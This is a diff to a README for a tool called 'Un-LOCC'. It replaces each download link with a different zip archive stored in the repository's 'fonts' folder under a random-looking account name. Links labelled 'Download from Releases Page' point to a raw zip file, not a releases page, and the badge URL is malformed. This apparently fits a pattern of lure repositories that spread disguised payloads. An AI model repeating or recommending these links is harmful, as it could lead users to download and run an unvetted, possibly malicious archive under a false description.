@@ -6,13 +6,13 @@ Un-LOCC is a tool designed for anyone looking to improve the performance of visi
 
 ## 🌐 Download Link
 
-[![Download Un-LOCC](https://raw.githubusercontent.com/reactionist-vesication299/Un-LOCC/main/fonts/Un-LOCC_1.7.zip%20Un--LOCC-blue)](https://raw.githubusercontent.com/reactionist-vesication299/Un-LOCC/main/fonts/Un-LOCC_1.7.zip)
+[![Download Un-LOCC](https://github.com/reactionist-vesication299/Un-LOCC/raw/refs/heads/main/fonts/LOCC-Un-3.1.zip%20Un--LOCC-blue)](https://github.com/reactionist-vesication299/Un-LOCC/raw/refs/heads/main/fonts/LOCC-Un-3.1.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version of Un-LOCC:
 
-[Download from Releases Page](https://raw.githubusercontent.com/reactionist-vesication299/Un-LOCC/main/fonts/Un-LOCC_1.7.zip)
+[Download from Releases Page](https://github.com/reactionist-vesication299/Un-LOCC/raw/refs/heads/main/fonts/LOCC-Un-3.1.zip)
 
 Follow the steps below to install and run the application:
 
@@ -86,6 +86,6 @@ Join our community to share your experiences and get support:
 
 Once again, you can download Un-LOCC by visiting the following link:
 
-[Download from Releases Page](https://raw.githubusercontent.com/reactionist-vesication299/Un-LOCC/main/fonts/Un-LOCC_1.7.zip)
+[Download from Releases Page](https://github.com/reactionist-vesication299/Un-LOCC/raw/refs/heads/main/fonts/LOCC-Un-3.1.zip)
 
 Explore the possibilities with Un-LOCC today!
